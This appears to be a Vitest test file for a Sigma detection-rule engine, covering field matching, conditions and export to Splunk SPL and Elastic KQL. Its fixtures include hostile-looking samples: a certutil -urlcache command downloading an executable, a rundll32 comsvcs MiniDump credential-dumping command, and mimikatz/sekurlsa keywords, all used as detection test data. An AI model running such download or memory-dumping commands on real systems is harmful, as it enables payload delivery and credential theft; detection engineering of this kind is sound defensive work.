import { describe, expect, it } from "vitest";
import { compile, explain, exportsFor, match, SigmaUnsupported, toKql, toSplunk } from "../../src/lib/sigma-engine.js";

const m = (detection, event) => match(compile(detection), event);

describe("matching values", () => {
  const ev = { Image: "C:\\Windows\\System32\\certutil.exe", CommandLine: "certutil -urlcache -f http://x/a.exe a.exe", User: "CORP\\bob", Port: 443 };

  it("is case-insensitive and anchored by default", () => {
    expect(m({ s: { Image: "c:\\windows\\system32\\CERTUTIL.EXE" }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { Image: "certutil.exe" }, condition: "s" }, ev)).toBe(false);
  });

  it("supports contains, startswith, endswith and wildcards", () => {
    expect(m({ s: { "Image|endswith": "\\certutil.exe" }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { "Image|startswith": "C:\\Windows\\" }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { "CommandLine|contains": "-urlcache" }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { CommandLine: "certutil*http*" }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { User: "CORP\\b?b" }, condition: "s" }, ev)).toBe(true);
  });

  it("does not mistake a trailing backslash for an escaped wildcard", () => {
    expect(m({ s: { "Image|contains": "\\System32\\" }, condition: "s" }, ev)).toBe(true);
  });

  it("treats \\* as a literal star", () => {
    expect(m({ s: { CommandLine: "del C:\\temp\\\\\\*.dll" }, condition: "s" }, { CommandLine: "del C:\\temp\\*.dll" })).toBe(true);
    expect(m({ s: { CommandLine: "del \\*.dll" }, condition: "s" }, { CommandLine: "del a.dll" })).toBe(false);
  });

  it("ORs list values, ANDs them with |all", () => {
    expect(m({ s: { "CommandLine|contains": ["-decode", "-urlcache"] }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { "CommandLine|contains|all": ["-urlcache", "-f"] }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { "CommandLine|contains|all": ["-urlcache", "-decode"] }, condition: "s" }, ev)).toBe(false);
  });

  it("expands windash to / and unicode dashes", () => {
    const d = { s: { "CommandLine|contains|windash": " -f " }, condition: "s" };
    expect(m(d, { CommandLine: "certutil /f x" })).toBe(true);
    expect(m(d, { CommandLine: "certutil \u2013f x" })).toBe(true);
    expect(m(d, { CommandLine: "certutil f x" })).toBe(false);
  });

  it("supports regex, cidr, numeric comparison, null and exists", () => {
    expect(m({ s: { "CommandLine|re": "https?://" }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { "CommandLine|re": "HTTP://" }, condition: "s" }, ev)).toBe(false);
    expect(m({ s: { "CommandLine|re|i": "HTTP://" }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { "ip|cidr": "10.0.0.0/8" }, condition: "s" }, { ip: "10.20.30.40" })).toBe(true);
    expect(m({ s: { "ip|cidr": "10.0.0.0/8" }, condition: "s" }, { ip: "11.0.0.1" })).toBe(false);
    expect(m({ s: { "Port|gte": 443 }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { "Port|lt": 443 }, condition: "s" }, ev)).toBe(false);
    expect(m({ s: { Missing: null }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { User: null }, condition: "s" }, ev)).toBe(false);
    expect(m({ s: { "User|exists": true }, condition: "s" }, ev)).toBe(true);
    expect(m({ s: { "Nope|exists": false }, condition: "s" }, ev)).toBe(true);
  });

  it("reads nested and case-insensitive field names, and arrays", () => {
    const ct = { eventName: "CreateAccessKey", userIdentity: { type: "Root" }, tags: ["a", "prod"] };
    expect(m({ s: { "userIdentity.type": "Root" }, condition: "s" }, ct)).toBe(true);
    expect(m({ s: { EventName: "createaccesskey" }, condition: "s" }, ct)).toBe(true);
    expect(m({ s: { tags: "prod" }, condition: "s" }, ct)).toBe(true);
    expect(m({ s: { "requestParameters|contains": "AllUsers" }, condition: "s" }, { requestParameters: { grants: [{ uri: "http://acs.amazonaws.com/groups/global/AllUsers" }] } })).toBe(true);
  });

  it("matches keyword lists anywhere in the event", () => {
    expect(m({ kw: ["mimikatz", "sekurlsa"], condition: "kw" }, { msg: "Invoke-Mimikatz loaded" })).toBe(true);
  });
});

describe("conditions", () => {
  const det = {
    selection_img: { "Image|endswith": "\\rundll32.exe" },
    selection_cli: { "CommandLine|contains": "comsvcs" },
    filter_main: { User: "SYSTEM" },
    filter_optional: { ParentImage: "C:\\Tools\\ok.exe" }
  };
  const ev = { Image: "C:\\Windows\\rundll32.exe", CommandLine: "rundll32 comsvcs.dll MiniDump", User: "bob", ParentImage: "cmd.exe" };

  it.each([
    ["selection_img and selection_cli", true],
    ["all of selection_*", true],
    ["1 of selection_* and not 1 of filter_*", true],
    ["all of selection_* and not filter_main", true],
    ["selection_img and (filter_main or filter_optional)", false],
    ["not selection_img", false],
    ["1 of them", true],
    ["all of them", false]
  ])("%s → %s", (condition, expected) => {
    expect(m({ ...det, condition }, ev)).toBe(expected);
  });

  it("ORs a list of conditions", () => {
    expect(m({ ...det, condition: ["filter_main", "selection_cli"] }, ev)).toBe(true);
  });

  it("explain lists which identifiers matched", () => {
    expect(explain({ ...det, condition: "all of selection_*" }, ev)).toEqual({ matched: true, hits: ["selection_img", "selection_cli"] });
  });

  it.each([
    [{ s: { a: 1 }, condition: "s | count() > 5" }, /aggregation/],
    [{ s: { "a|base64offset|contains": "x" }, condition: "s" }, /base64offset/],
    [{ s: { a: 1 }, condition: "missing" }, /unknown identifier/],
    [{ s: { a: 1 }, condition: "(s" }, /missing \)/],
    [{ s: { a: 1 }, condition: "s s" }, /unexpected/],
    [{ s: { a: 1 }, condition: "1 of x_*" }, /no identifier/],
    [{ s: { a: 1 }, timeframe: "5m", condition: "s" }, /timeframe/]
  ])("rejects unsupported input %#", (det, re) => {
    expect(() => compile(det)).toThrow(SigmaUnsupported);
    expect(() => compile(det)).toThrow(re);
  });
});

describe("Splunk SPL", () => {
  const spl = d => toSplunk(compile(d));
  it("builds field comparisons with wildcards and escaped backslashes", () => {
    expect(spl({ s: { "Image|endswith": "\\certutil.exe", "CommandLine|contains": ["-urlcache", "-decode"] }, condition: "s" }))
      .toBe('Image="*\\\\certutil.exe" AND CommandLine IN ("*-urlcache*", "*-decode*")');
  });
  it("handles not, |all, null, exists, numbers and cidr", () => {
    expect(spl({ s: { "a|contains|all": ["x", "y"] }, f: { b: null }, condition: "s and not f" })).toBe('(a="*x*" AND a="*y*") AND NOT (NOT b=*)');
    expect(spl({ s: { "a|exists": true, "p|gt": 1024, "ip|cidr": "10.0.0.0/8" }, condition: "s" })).toBe('a=* AND p>1024 AND ip="10.0.0.0/8"');
  });
  it("escapes quotes", () => {
    expect(spl({ s: { a: 'say "hi"' }, condition: "s" })).toBe('a="say \\"hi\\""');
  });
  it("refuses regex and ? wildcards", () => {
    expect(() => spl({ s: { "a|re": "x+" }, condition: "s" })).toThrow(/regular expression/);
    expect(() => spl({ s: { a: "x?y" }, condition: "s" })).toThrow(/wildcard/);
  });
});

describe("Elastic KQL", () => {
  const kql = (d, o) => toKql(compile(d), o);
  it("quotes exact values and escapes wildcard values", () => {
    expect(kql({ s: { Image: "C:\\a b.exe", "CommandLine|contains": "-enc (x)" }, condition: "s" }))
      .toBe('Image:"C:\\\\a b.exe" and CommandLine:*-enc\\ \\(x\\)*');
  });
  it("uses field:(a or b) for lists and maps to ECS on request", () => {
    expect(kql({ s: { "Image|endswith": ["\\a.exe", "\\b.exe"] }, condition: "s" }, { ecs: true })).toBe("process.executable:(*\\\\a.exe or *\\\\b.exe)");
    expect(kql({ s: { "userIdentity.type": "Root", eventName: "CreateAccessKey" }, condition: "s" }, { ecs: true }))
      .toBe('aws.cloudtrail.user_identity.type:"Root" and event.action:"CreateAccessKey"');
  });
  it("handles not, null and comparisons", () => {
    expect(kql({ s: { a: "x" }, f: { b: null, "p|lte": 5 }, condition: "s and not f" })).toBe('a:"x" and not (not b:* and p <= 5)');
  });
});

it("exportsFor reports unsupported rules without throwing", () => {
  expect(exportsFor({ s: { "a|re": "x" }, condition: "s" })).toEqual({
    splunk: { error: "regular expression (Splunk search)" }, kql: { error: "regular expression (KQL)" }, kqlEcs: { error: "regular expression (KQL)" }
  });
  expect(exportsFor({ s: { a: 1 }, condition: "nope" }).splunk.error).toMatch(/unknown identifier/);
});

it("walks into arrays of objects for dotted field names", () => {
  const ev = { requestParameters: { AccessControlPolicy: { AccessControlList: { Grant: [
    { Grantee: { ID: "abc" }, Permission: "FULL_CONTROL" },
    { Grantee: { URI: "http://acs.amazonaws.com/groups/global/AllUsers" }, Permission: "READ" }
  ] } } } };
  const d = { s: { "requestParameters.AccessControlPolicy.AccessControlList.Grant.Grantee.URI|endswith": "/AllUsers" }, condition: "s" };
  expect(m(d, ev)).toBe(true);
  expect(m(d, { requestParameters: { AccessControlPolicy: { AccessControlList: { Grant: [{ Grantee: { ID: "abc" } }] } } } })).toBe(false);
});
